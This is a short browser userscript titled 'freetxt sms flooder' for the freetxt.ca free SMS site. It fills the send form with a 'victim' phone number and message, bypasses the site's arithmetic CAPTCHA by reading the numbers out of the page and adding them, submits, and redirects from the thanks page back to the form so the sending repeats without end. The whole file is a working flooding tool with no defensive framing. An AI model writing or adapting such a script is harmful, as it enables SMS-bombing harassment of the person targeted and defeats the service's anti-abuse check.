// ==UserScript==
// @name          freetxt sms flooder 
// @namespace     ankur :P
// @include       http://www.freetxt.ca/*
// ==/UserScript==


var message = 'hi';
var victim = "";

if(document.location=="http://www.freetxt.ca"||document.location=="http://freetxt.ca")
{

document.forms[0].elements[2].value=victim;
document.forms[0].elements[3].value=message;
document.forms[0].elements[5].value = parseInt(document.forms[0].elements[5].parentNode.childNodes[0].innerHTML.substring(14,16))+parseInt(document.forms[0].elements[5].parentNode.childNodes[0].innerHTML.substring(19,21))
document.forms[0].elements[3].click();
}

if(document.location=="http://www.freetxt.ca/index.php?page=thanks"||document.location=="http://freetxt.ca/index.php?page=thanks")
{
document.location="http://www.freetxt.ca"
}